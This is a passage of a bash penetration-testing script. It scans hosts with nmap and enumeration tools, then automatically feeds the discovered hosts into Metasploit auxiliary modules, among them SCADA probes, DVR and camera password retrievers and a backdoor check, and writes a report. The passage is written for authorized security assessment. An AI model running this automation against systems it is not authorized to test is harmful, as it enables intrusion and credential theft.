     nmap -iL $name/apache-hbase.txt -Pn -n --open -p60010,60030 --script=hbase-master-info,hbase-region-info --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-apache-hbase.txt
fi

rm tmp*

for x in $name/./script*; do
     if grep '|' $x > /dev/null 2>&1; then
          echo > /dev/null 2>&1
     else
          rm $x > /dev/null 2>&1
     fi
done

##############################################################################################################

# Additional tools

if [[ -e $name/161.txt ]]; then
     onesixtyone -c /usr/share/doc/onesixtyone/dict.txt -i $name/161.txt > $name/onesixtyone.txt
fi

if [ -e $name/445.txt ] || [ -e $name/500.txt ]; then
     echo
     echo $medium
     echo
     echo -e "\x1B[1;34mRunning additional tools.\x1B[0m"
fi

if [[ -e $name/445.txt ]]; then
     echo "     enum4linux"
     for i in $(cat $name/445.txt); do
          enum4linux -a $i | egrep -v "(Can't determine|enum4linux|Looking up status|No printers|No reply from|unknown|[E])" > tmp
          cat -s tmp >> $name/script-enum4linux.txt
     done
fi

if [[ -e $name/445.txt ]]; then
     echo "     smbclient"
     for i in $(cat $name/445.txt); do
          echo $i >> $name/script-smbclient.txt
          smbclient -L $i -N | grep -v 'failed' >> $name/script-smbclient.txt 2>/dev/null
          echo >> $name/script-smbclient.txt
     done
fi

if [[ -e $name/500.txt ]]; then
     echo "     ike-scan"
     for i in $(cat $name/445.txt); do
          ike-scan -f $i >> $name/script-ike-scan.txt
     done
fi

rm tmp 2>/dev/null
}

##############################################################################################################

f_metasploit(){
echo
echo $medium
echo
echo -ne "\x1B[1;33mRun matching Metasploit auxiliaries? (y/N) \x1B[0m"
read msf

if [ "$msf" == "y" ]; then
     f_run-metasploit
else
     f_report
fi
}

##############################################################################################################

f_run-metasploit(){
echo
echo -e "\x1B[1;34mStarting Postgres.\x1B[0m"
service postgresql start

echo
echo -e "\x1B[1;34mStarting Metasploit.\x1B[0m"
echo
echo -e "\x1B[1;34mUsing the following resource files.\x1B[0m"
cp -R $discover/resource/ /tmp/

echo workspace -a $name > /tmp/master
echo spool tmpmsf > /tmp/master

if [[ -e $name/19.txt ]]; then
     echo "     Chargen Probe Utility"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$discover\/$name\/19.txt|g" /tmp/resource/19-chargen.rc
     cat /tmp/resource/19-chargen.rc >> /tmp/master
fi

if [[ -e $name/21.txt ]]; then
     echo "     FTP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/21.txt|g" /tmp/resource/21-ftp.rc
     cat /tmp/resource/21-ftp.rc >> /tmp/master
fi

if [[ -e $name/22.txt ]]; then
     echo "     SSH"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/22.txt|g" /tmp/resource/22-ssh.rc
     cat /tmp/resource/22-ssh.rc >> /tmp/master
fi

if [[ -e $name/23.txt ]]; then
     echo "     Telnet"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/23.txt|g" /tmp/resource/23-telnet.rc
     cat /tmp/resource/23-telnet.rc >> /tmp/master
fi

if [[ -e $name/25.txt ]]; then
     echo "     SMTP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/25.txt|g" /tmp/resource/25-smtp.rc
     cat /tmp/resource/25-smtp.rc >> /tmp/master
fi

if [[ -e $name/69.txt ]]; then
     echo "     TFTP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/69.txt|g" /tmp/resource/69-tftp.rc
     cat /tmp/resource/69-tftp.rc >> /tmp/master
fi

if [[ -e $name/79.txt ]]; then
     echo "     Finger"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/79.txt|g" /tmp/resource/79-finger.rc
     cat /tmp/resource/79-finger.rc >> /tmp/master
fi

if [[ -e $name/80.txt ]]; then
     echo "     Lotus"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/80.txt|g" /tmp/resource/80-lotus.rc
     cat /tmp/resource/80-lotus.rc >> /tmp/master
fi

if [[ -e $name/80.txt ]]; then
     echo "     SCADA Indusoft WebStudio NTWebServer"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/80.txt|g" /tmp/resource/80-scada.rc
     cat /tmp/resource/80-scada.rc >> /tmp/master
fi

if [[ -e $name/110.txt ]]; then
     echo "     POP3"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/110.txt|g" /tmp/resource/110-pop3.rc
     cat /tmp/resource/110-pop3.rc >> /tmp/master
fi

if [[ -e $name/111.txt ]]; then
     echo "     RPC"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/111.txt|g" /tmp/resource/111-rpc.rc
     cat /tmp/resource/111-rpc.rc >> /tmp/master
fi

if [[ -e $name/123.txt ]]; then
     echo "     NTP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/123.txt|g" /tmp/resource/123-udp-ntp.rc
     cat /tmp/resource/123-udp-ntp.rc >> /tmp/master
fi

if [[ -e $name/135.txt ]]; then
     echo "     DCE/RPC"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/135.txt|g" /tmp/resource/135-dcerpc.rc
     cat /tmp/resource/135-dcerpc.rc >> /tmp/master
fi

if [[ -e $name/137.txt ]]; then
     echo "     NetBIOS"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/137.txt|g" /tmp/resource/137-udp-netbios.rc
     cat /tmp/resource/137-udp-netbios.rc >> /tmp/master
fi

if [[ -e $name/143.txt ]]; then
     echo "     IMAP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/143.txt|g" /tmp/resource/143-imap.rc
     cat /tmp/resource/143-imap.rc >> /tmp/master
fi

if [[ -e $name/161.txt ]]; then
     echo "     SNMP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/161.txt|g" /tmp/resource/161-udp-snmp.rc
     cat /tmp/resource/161-udp-snmp.rc >> /tmp/master
fi

if [[ -e $name/407.txt ]]; then
     echo "     Motorola"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/407.txt|g" /tmp/resource/407-udp-motorola.rc
     cat /tmp/resource/407-udp-motorola.rc >> /tmp/master
fi

if [[ -e $name/443.txt ]]; then
     echo "     VMware"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/443.txt|g" /tmp/resource/443-vmware.rc
     cat /tmp/resource/443-vmware.rc >> /tmp/master
fi

if [[ -e $name/445.txt ]]; then
     echo "     SMB"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/445.txt|g" /tmp/resource/445-smb.rc
     cat /tmp/resource/445-smb.rc >> /tmp/master
fi

if [[ -e $name/465.txt ]]; then
     echo "     SMTP/S"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/465.txt|g" /tmp/resource/465-smtp.rc
     cat /tmp/resource/465-smtp.rc >> /tmp/master
fi

if [[ -e $name/502.txt ]]; then
     echo "     SCADA Modbus Client Utility"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/502.txt|g" /tmp/resource/502-scada.rc
     cat /tmp/resource/502-scada.rc >> /tmp/master
fi

if [[ -e $name/512.txt ]]; then
     echo "     Rexec"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/512.txt|g" /tmp/resource/512-rexec.rc
     cat /tmp/resource/512-rexec.rc >> /tmp/master
fi

if [[ -e $name/513.txt ]]; then
     echo "     rlogin"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/513.txt|g" /tmp/resource/513-rlogin.rc
     cat /tmp/resource/513-rlogin.rc >> /tmp/master
fi

if [[ -e $name/514.txt ]]; then
     echo "     rshell"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/514.txt|g" /tmp/resource/514-rshell.rc
     cat /tmp/resource/514-rshell.rc >> /tmp/master
fi

if [[ -e $name/523.txt ]]; then
     echo "     db2"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/523.txt|g" /tmp/resource/523-udp-db2.rc
     cat /tmp/resource/523-udp-db2.rc >> /tmp/master
fi

if [[ -e $name/548.txt ]]; then
     echo "     AFP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/548.txt|g" /tmp/resource/548-afp.rc
     cat /tmp/resource/548-afp.rc >> /tmp/master
fi

if [[ -e $name/623.txt ]]; then
     echo "     IPMI"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/623.txt|g" /tmp/resource/623-udp-ipmi.rc
     cat /tmp/resource/623-udp-ipmi.rc >> /tmp/master
fi

if [[ -e $name/771.txt ]]; then
     echo "     SCADA Digi"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/771.txt|g" /tmp/resource/771-scada.rc
     cat /tmp/resource/771-scada.rc >> /tmp/master
fi

if [[ -e $name/831.txt ]]; then
     echo "     EasyCafe Server Remote File Access"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/831.txt|g" /tmp/resource/831-easycafe.rc
     cat /tmp/resource/831-easycafe.rc >> /tmp/master
fi

if [[ -e $name/902.txt ]]; then
     echo "     VMware"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/902.txt|g" /tmp/resource/902-vmware.rc
     cat /tmp/resource/902-vmware.rc >> /tmp/master
fi

if [[ -e $name/998.txt ]]; then
     echo "     Novell ZENworks Configuration Management Preboot Service Remote File Access"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/998.txt|g" /tmp/resource/998-zenworks.rc
     cat /tmp/resource/998-zenworks.rc >> /tmp/master
fi

if [[ -e $name/1099.txt ]]; then
     echo "     RMI Registery"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/1099.txt|g" /tmp/resource/1099-rmi.rc
     cat /tmp/resource/1099-rmi.rc >> /tmp/master
fi

if [[ -e $name/1158.txt ]]; then
     echo "     Oracle"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/1158.txt|g" /tmp/resource/1158-oracle.rc
     cat /tmp/resource/1158-oracle.rc >> /tmp/master
fi

if [[ -e $name/1433.txt ]]; then
     echo "     MS-SQL"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/1433.txt|g" /tmp/resource/1433-mssql.rc
     cat /tmp/resource/1433-mssql.rc >> /tmp/master
fi

if [[ -e $name/1521.txt ]]; then
     echo "     Oracle"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/1521.txt|g" /tmp/resource/1521-oracle.rc
     cat /tmp/resource/1521-oracle.rc >> /tmp/master
fi

if [[ -e $name/1604.txt ]]; then
     echo "     Citrix"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/1604.txt|g" /tmp/resource/1604-udp-citrix.rc
     cat /tmp/resource/1604-udp-citrix.rc >> /tmp/master
fi

if [[ -e $name/1720.txt ]]; then
     echo "     H323"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/1720.txt|g" /tmp/resource/1720-h323.rc
     cat /tmp/resource/1720-h323.rc >> /tmp/master
fi

if [[ -e $name/1900.txt ]]; then
     echo "     UPnP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/1900.txt|g" /tmp/resource/1900-udp-upnp.rc
     cat /tmp/resource/1900-udp-upnp.rc >> /tmp/master
fi

if [[ -e $name/2049.txt ]]; then
     echo "     NFS"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/2049.txt|g" /tmp/resource/2049-nfs.rc
     cat /tmp/resource/2049-nfs.rc >> /tmp/master
fi

if [[ -e $name/2362.txt ]]; then
     echo "     SCADA Digi"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/2362.txt|g" /tmp/resource/2362-udp-scada.rc
     cat /tmp/resource/2362-udp-scada.rc >> /tmp/master
fi

if [[ -e $name/3000.txt ]]; then
     echo "     EMC"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/3000.txt|g" /tmp/resource/3000-emc.rc
     cat /tmp/resource/3000-emc.rc >> /tmp/master
fi

if [[ -e $name/3050.txt ]]; then
     echo "     Borland InterBase Services Manager Information"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/3050.txt|g" /tmp/resource/3050-borland.rc
     cat /tmp/resource/3050-borland.rc >> /tmp/master
fi

if [[ -e $name/3306.txt ]]; then
     echo "     MySQL"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/3306.txt|g" /tmp/resource/3306-mysql.rc
     cat /tmp/resource/3306-mysql.rc >> /tmp/master
fi

if [[ -e $name/3310.txt ]]; then
     echo "     ClamAV"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/3310.txt|g" /tmp/resource/3310-clamav.rc
     cat /tmp/resource/3310-clamav.rc >> /tmp/master
fi

if [[ -e $name/3389.txt ]]; then
     echo "     RDP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/3389.txt|g" /tmp/resource/3389-rdp.rc
     cat /tmp/resource/3389-rdp.rc >> /tmp/master
fi

if [[ -e $name/3500.txt ]]; then
     echo "     EMC"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/3500.txt|g" /tmp/resource/3500-emc.rc
     cat /tmp/resource/3500-emc.rc >> /tmp/master
fi

if [[ -e $name/5040.txt ]]; then
     echo "     DCE/RPC"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5040.txt|g" /tmp/resource/5040-dcerpc.rc
     cat /tmp/resource/5040-dcerpc.rc >> /tmp/master
fi

if [[ -e $name/5060.txt ]]; then
     echo "     SIP UDP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5060.txt|g" /tmp/resource/5060-udp-sip.rc
     cat /tmp/resource/5060-udp-sip.rc >> /tmp/master
fi

if [[ -e $name/5060-tcp.txt ]]; then
     echo "     SIP"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5060-tcp.txt|g" /tmp/resource/5060-sip.rc
     cat /tmp/resource/5060-sip.rc >> /tmp/master
fi

if [[ -e $name/5432.txt ]]; then
     echo "     Postgres"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5432.txt|g" /tmp/resource/5432-postgres.rc
     cat /tmp/resource/5432-postgres.rc >> /tmp/master
fi

if [[ -e $name/5560.txt ]]; then
     echo "     Oracle iSQL"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5560.txt|g" /tmp/resource/5560-oracle.rc
     cat /tmp/resource/5560-oracle.rc >> /tmp/master
fi

if [[ -e $name/5631.txt ]]; then
     echo "     pcAnywhere"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5631.txt|g" /tmp/resource/5631-pcanywhere.rc
     cat /tmp/resource/5631-pcanywhere.rc >> /tmp/master
fi

if [[ -e $name/5632.txt ]]; then
     echo "     pcAnywhere"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5632.txt|g" /tmp/resource/5632-pcanywhere.rc
     cat /tmp/resource/5632-pcanywhere.rc >> /tmp/master
fi

if [[ -e $name/5900.txt ]]; then
     echo "     VNC"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5900.txt|g" /tmp/resource/5900-vnc.rc
     cat /tmp/resource/5900-vnc.rc >> /tmp/master
fi

if [[ -e $name/5920.txt ]]; then
     echo "     CCTV DVR"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5920.txt|g" /tmp/resource/5920-cctv.rc
     cat /tmp/resource/5920-cctv.rc >> /tmp/master
fi

if [[ -e $name/5984.txt ]]; then
     echo "     CouchDB"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5984.txt|g" /tmp/resource/5984-couchdb.rc
     cat /tmp/resource/5984-couchdb.rc >> /tmp/master
fi

if [[ -e $name/5985.txt ]]; then
     echo "     winrm"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/5985.txt|g" /tmp/resource/5985-winrm.rc
     cat /tmp/resource/5985-winrm.rc >> /tmp/master
fi

if [[ -e $name/x11.txt ]]; then
     echo "     x11"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/x11.txt|g" /tmp/resource/6000-5-x11.rc
     cat /tmp/resource/6000-5-x11.rc >> /tmp/master
fi

if [[ -e $name/6379.txt ]]; then
     echo "     Redis"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/6379.txt|g" /tmp/resource/6379-redis.rc
     cat /tmp/resource/6379-redis.rc >> /tmp/master
fi

if [[ -e $name/7777.txt ]]; then
     echo "     Backdoor"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/7777.txt|g" /tmp/resource/7777-backdoor.rc
     cat /tmp/resource/7777-backdoor.rc >> /tmp/master
fi

if [[ -e $name/8000.txt ]]; then
     echo "     Canon"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/8000.txt|g" /tmp/resource/8000-canon.rc
     cat /tmp/resource/8000-canon.rc >> /tmp/master
fi

if [[ -e $name/8080.txt ]]; then
     echo "     Tomcat"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/8080.txt|g" /tmp/resource/8080-tomcat.rc
     cat /tmp/resource/8080-tomcat.rc >> /tmp/master
fi

if [[ -e $name/8080.txt ]]; then
     echo "     Oracle"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/8080.txt|g" /tmp/resource/8080-oracle.rc
     cat /tmp/resource/8080-oracle.rc >> /tmp/master
fi

if [[ -e $name/8222.txt ]]; then
     echo "     VMware"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/8222.txt|g" /tmp/resource/8222-vmware.rc
     cat /tmp/resource/8222-vmware.rc >> /tmp/master
fi

if [[ -e $name/8400.txt ]]; then
     echo "     Adobe"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/8400.txt|g" /tmp/resource/8400-adobe.rc
     cat /tmp/resource/8400-adobe.rc >> /tmp/master
fi

if [[ -e $name/8834.txt ]]; then
     echo "     Nessus"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/8834.txt|g" /tmp/resource/8834-nessus.rc
     cat /tmp/resource/8834-nessus.rc >> /tmp/master
fi

if [[ -e $name/9000.txt ]]; then
     echo "     Sharp DVR Password Retriever"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/9000.txt|g" /tmp/resource/9000-sharp.rc
     cat /tmp/resource/9000-sharp.rc >> /tmp/master
fi

if [[ -e $name/9084.txt ]]; then
     echo "     VMware"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/9084.txt|g" /tmp/resource/9084-vmware.rc
     cat /tmp/resource/9084-vmware.rc >> /tmp/master
fi

if [[ -e $name/9100.txt ]]; then
     echo "     Printers"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/9100.txt|g" /tmp/resource/9100-printers.rc
     cat /tmp/resource/9100-printers.rc >> /tmp/master
fi

if [[ -e $name/9999.txt ]]; then
     echo "     Telnet"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/9999.txt|g" /tmp/resource/9999-telnet.rc
     cat /tmp/resource/9999-telnet.rc >> /tmp/master
fi

if [[ -e $name/13364.txt ]]; then
     echo "     Rosewill RXS-3211 IP Camera Password Retriever"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/13364.txt|g" /tmp/resource/13364-rosewill.rc
     cat /tmp/resource/13364-rosewill.rc >> /tmp/master
fi

if [[ -e $name/17185.txt ]]; then
     echo "     VxWorks"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/17185.txt|g" /tmp/resource/17185-udp-vxworks.rc
     cat /tmp/resource/17185-udp-vxworks.rc >> /tmp/master
fi

if [[ -e $name/28784.txt ]]; then
     echo "     SCADA Koyo DirectLogic PLC"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/28784.txt|g" /tmp/resource/28784-scada.rc
     cat /tmp/resource/28784-scada.rc >> /tmp/master
fi

if [[ -e $name/30718.txt ]]; then
     echo "     Telnet"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/30718.txt|g" /tmp/resource/30718-telnet.rc
     cat /tmp/resource/30718-telnet.rc >> /tmp/master
fi

if [[ -e $name/37777.txt ]]; then
     echo "     Dahua DVR"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/37777.txt|g" /tmp/resource/37777-dahua-dvr.rc
     cat /tmp/resource/37777-dahua-dvr.rc >> /tmp/master
fi

if [[ -e $name/46824.txt ]]; then
     echo "     SCADA Sielco Sistemi"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/46824.txt|g" /tmp/resource/46824-scada.rc
     cat /tmp/resource/46824-scada.rc >> /tmp/master
fi

if [[ -e $name/50000.txt ]]; then
     echo "     db2"
     sed -i "s|setg RHOSTS.*|setg RHOSTS file:$name\/50000.txt|g" /tmp/resource/50000-db2.rc
     cat /tmp/resource/50000-db2.rc >> /tmp/master
fi

echo db_export -f xml -a $name/metasploit.xml >> /tmp/master
echo exit >> /tmp/master

x=$(wc -l /tmp/master | cut -d ' ' -f1)

if [ $x -eq 3 ]; then
     echo 2>/dev/null
else
     echo
     sed 's/\/\//\//g' /tmp/master > $name/master.rc
     msfdb init
     msfconsole -r $name/master.rc
     cat tmpmsf | egrep -iv "(> exit|> run|% complete|Attempting to extract|Authorization not requested|Checking if file|completed|Connecting to the server|Connection reset by peer|data_connect failed|db_export|did not reply|does not appear|doesn't exist|Finished export|Handshake failed|ineffective|It doesn't seem|Login Fail|negotiation failed|NoMethodError|No relay detected|no response|No users found|not be identified|not found|NOT VULNERABLE|Providing some time|request timeout|responded with error|RPORT|RHOSTS|Scanning for vulnerable|Shutting down the TFTP|Spooling|Starting export|Starting TFTP server|Starting VNC login|THREADS|Timed out after|timed out|Trying to acquire|Unable to|unknown state)" > $name/metasploit.txt
     rm $name/master.rc
	rm tmpmsf
fi
}

##############################################################################################################

f_enumerate(){
clear
f_banner
f_typeofscan

echo -n "Enter the location of your previous scan: "
read -e location

# Check for no answer
if [[ -z $location ]]; then
     f_error
fi

# Check for wrong answer
if [ ! -d $location ]; then
     f_error
fi

name=$location

echo
echo -n "Set scan delay. (0-5, enter for normal) "
read delay

# Check for no answer
if [[ -z $delay ]]; then
     delay='0'
fi

if [ $delay -lt 0 ] || [ $delay -gt 5 ]; then
     f_error
fi

f_scripts
echo
echo $medium
f_run-metasploit

echo
echo -e "\x1B[1;34mStopping Postgres.\x1B[0m"
service postgresql stop

echo
echo $medium
echo
echo "***Scan complete.***"
echo
echo
printf 'The supporting data folder is located at \x1B[1;33m%s\x1B[0m\n' $name
echo
echo
exit
}

##############################################################################################################

f_report(){
END=$(date +%r\ %Z)
filename=$name/report.txt
host=$(wc -l $name/hosts.txt | cut -d ' ' -f1)

echo "Nmap Report" > $filename
date +%A" - "%B" "%d", "%Y >> $filename
echo >> $filename
echo "Start time   $START" >> $filename
echo "Finish time  $END" >> $filename
echo "Scanner IP   $ip" >> $filename
echo >> $filename
echo $medium >> $filename
echo >> $filename

if [ -e $name/script-smbvulns.txt ]; then
     echo "May be vulnerable to MS08-067 & more." >> $filename
     echo >> $filename
     cat $name/script-smbvulns.txt >> $filename
     echo >> $filename
     echo $medium >> $filename
     echo >> $filename
fi

echo "Hosts Discovered ($host)" >> $filename
echo >> $filename
cat $name/hosts.txt >> $filename 2>/dev/null
echo >> $filename

if [[ ! -s $name/ports.txt ]]; then
     rm -rf "$name" tmp*
     echo
     echo $medium
     echo
     echo "***Scan complete.***"
     echo
     echo
     echo -e "\x1B[1;33mNo hosts found with open ports.\x1B[0m"
     echo
     echo
     exit
else
     ports=$(wc -l $name/ports.txt | cut -d ' ' -f1)
fi

echo $medium >> $filename
echo >> $filename
echo "Open Ports ($ports)" >> $filename
echo >> $filename

if [ -s $name/ports-tcp.txt ]; then
     echo "TCP Ports" >> $filename
     cat $name/ports-tcp.txt >> $filename
     echo >> $filename
fi

if [ -s $name/ports-udp.txt ]; then
     echo "UDP Ports" >> $filename
     cat $name/ports-udp.txt >> $filename
     echo >> $filename
fi

echo $medium >> $filename

if [ -e $name/banners.txt ]; then
     banners=$(wc -l $name/banners.txt | cut -d ' ' -f1)
     echo >> $filename
     echo "Banners ($banners)" >> $filename
     echo >> $filename
     cat $name/banners.txt >> $filename
     echo >> $filename
     echo $medium >> $filename
fi

echo >> $filename
echo "High Value Hosts by Port" >> $filename
echo >> $filename

HVPORTS="13 19 21 22 23 25 37 53 67 69 70 79 80 102 110 111 119 123 135 137 139 143 161 389 407 433 443 445 465 500 502 512 513 514 523 524 548 554 563 587 623 631 636 771 831 873 902 993 995 998 1050 1080 1099 1158 1344 1352 1433 1434 1521 1604 1720 1723 1883 1900 1911 1962 2049 2202 2302 2362 2375 2628 2947 3000 3031 3050 3260 3306 3310 3389 3478 3500 3632 3671 4369 5019 5040 5060 5353 5432 5560 5631 5632 5666 5672 5683 5850 5900 5920 5984 5985 6000 6001 6002 6003 6004 6005 6379 6481 6666 7210 7634 7777 8000 8009 8080 8081 8091 8222 8332 8333 8400 8443 8834 9000 9084 9100 9160 9600 9999 10000 11211 12000 12345 13364 17185 19150 27017 28784 30718 31337 35871 37777 44818 46824 47808 49152 50000 50030 50060 50070 50075 50090 60010 60030"

for i in $HVPORTS; do
     if [[ -e $name/$i.txt ]]; then
          echo "Port $i" >> $filename
          cat $name/$i.txt >> $filename
          echo >> $filename
     fi
done

echo $medium >> $filename
echo >> $filename
cat $name/nmap.txt >> $filename
echo $medium >> $filename
echo $medium >> $filename
echo >> $filename
echo "Nmap Scripts" >> $filename

SCRIPTS="script-13 script-21 script-22 script-23 script-smtp script-37 script-53 script-67 script-70 script-79 script-102 script-110 script-111 script-nntp script-123 script-137 script-139 script-143 script-161 script-389 script-445 script-500 script-523 script-524 script-548 script-554 script-623 script-631 script-636 script-873 script-993 script-995 script-1050 script-1080 script-1099 script-1344 script-1352 script-1433 script-1434 script-1521 script-1604 script-1723 script-1883 script-1911 script-1962 script-2049 script-2202 script-2302 script-2375 script-2628 script-2947 script-3031 script-3260 script-3306 script-3310 script-3389 script-3478 script-3632 script-3671 script-4369 script-5019 script-5060 script-5353 script-5666 script-5672 script-5683 script-5850 script-5900 script-5984 script-x11 script-6379 script-6481 script-6666 script-7210 script-7634 script-8000 script-8009 script-8081 script-8091 script-bitcoin script-9100 script-9160 script-9600 script-9999 script-10000 script-11211 script-12000 script-12345 script-17185 script-19150 script-27017 script-31337 script-35871 script-44818 script-47808 script-49152 script-50000 script-hadoop script-apache-hbase"

for i in $SCRIPTS; do
     if [[ -e $name/"$i.txt" ]]; then
          cat $name/"$i.txt" >> $filename
          echo $medium >> $filename
     fi
done

if [ -e $name/script-enum4linux.txt ] || [ -e $name/script-smbclient.txt ] || [ -e $name/ike-scan.txt ]; then
     echo $medium >> $filename
     echo >> $filename
     echo "Additional Enumeration" >> $filename

     if [ -e $name/script-enum4linux.txt ]; then
          cat $name/script-enum4linux.txt >> $filename
          echo $medium >> $filename
          echo >> $filename
     fi

     if [ -e $name/script-smbclient.txt ]; then
          cat $name/script-smbclient.txt >> $filename
          echo $medium >> $filename
     fi

     if [ -e $name/script-ike-scan.txt ]; then
          cat $name/script-ike-scan.txt >> $filename
          echo $medium >> $filename
     fi
fi

mv $name $home/data/

START=0
END=0

echo
echo $medium
echo
echo "***Scan complete.***"
echo
echo
printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/$name/report.txt
echo
echo
exit
}

##############################################################################################################

f_directObjectRef(){
clear
f_banner

echo -e "\x1B[1;34mUsing Burp, authenticate to a site, map & Spider, then log out.\x1B[0m"
echo -e "\x1B[1;34mTarget > Site map > select the URL > right click > Copy URLs in this host.\x1B[0m"
echo -e "\x1B[1;34mPaste the results into a new file.\x1B[0m"

f_location

for i in $(cat $location); do
     curl -sk -w "%{http_code} - %{url_effective} \\n" "$i" -o /dev/null 2>&1 | tee -a tmp
done

cat tmp | sort -u > DirectObjectRef.txt
mv DirectObjectRef.txt $home/data/DirectObjectRef.txt
rm tmp

echo
echo $medium
echo
echo "***Scan complete.***"
echo
echo
printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/DirectObjectRef.txt
echo
echo
exit
}

##############################################################################################################

f_multitabs(){
f_runlocally
clear
f_banner

echo -e "\x1B[1;34mOpen multiple tabs in $browser with:\x1B[0m"
echo
echo "1.  List"
echo "2.  Directories from a domain's robot.txt."
echo "3.  Previous menu"
echo
echo -n "Choice: "
read choice

case $choice in
     1) f_location
     echo -n "Use SSL? (y/N) "
     read ssl

     $web &
     sleep 2

     if [ -z $ssl ]; then
          for i in $(cat $location); do
               $web http://$i &
               sleep 1
          done
     elif [ "$ssl" == "y" ]; then
          for i in $(cat $location); do
               $web https://$i &
               sleep 1
          done
     else
          f_error
     fi
     ;;

     2)
     echo
     echo $medium
     echo
     echo "Usage: target.com or target-IP"
     echo
     echo -n "Domain: "
     read domain

     # Check for no answer
     if [[ -z $domain ]]; then
          f_error
     fi

     # Check for OS X
     if [[ `uname` == 'Darwin' ]]; then
          /usr/local/bin/wget -q $domain/robots.txt
     else
          wget -q $domain/robots.txt
     fi

     # Check if the file is empty
     if [ ! -s robots.txt ]; then
          echo
          echo -e "\x1B[1;31m$medium\x1B[0m"
          echo
          echo -e "\x1B[1;31m                          *** No robots file discovered. ***\x1B[0m"
          echo
          echo -e "\x1B[1;31m$medium\x1B[0m"
          sleep 2
          f_main
     fi

     grep 'Disallow' robots.txt | awk '{print $2}' > tmp

     $web &
     sleep 2

     for i in $(cat tmp); do
          $web http://$domain$i &
          sleep 1
     done

     rm robots.txt
     mv tmp $home/data/$domain-robots.txt

     echo
     echo $medium
     echo
     echo "***Scan complete.***"
     echo
     echo
